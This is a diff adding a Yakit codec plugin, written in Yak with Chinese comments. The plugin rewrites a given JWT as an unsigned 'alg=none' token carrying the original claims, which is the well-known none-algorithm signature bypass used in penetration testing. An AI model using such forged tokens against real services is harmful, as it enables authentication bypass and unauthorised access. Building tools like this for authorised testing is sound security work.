@@ -1,0 +1,37 @@
+# codec plugin
+
+/*
+Codec Plugin 可以支持在 Codec 中自定义编码解码，自定义 Bypass 与字符串处理函数
+
+函数定义非常简单
+
+func(i: string) string
+*/
+
+// 生成alg=none的JWT token
+func generateNoneAlgToken(token) {
+    // 解析原始token
+    parsedToken, _, err := jwt.Parse(token, "")
+    if err != nil {
+        yakit.Error("空密码测试失败: %v", err)
+    }
+    
+    // 获取payload部分
+    claims := parsedToken.Claims
+    
+    // 创建额外的header
+    extraHeader := {
+        "typ": "JWT",
+    }
+    // 使用JWSGenerateEx生成新token，alg设为none，key为空
+    noneToken, err := jwt.JWSGenerateEx("none", extraHeader, claims, []byte{})
+    if err != nil {
+        yakit.Error("生成none算法token失败: %v", err)
+        return
+    }
+    return noneToken
+}
+handle = func(origin /*string*/) {
+    # handle your origin str
+    return generateNoneAlgToken(origin)
+}
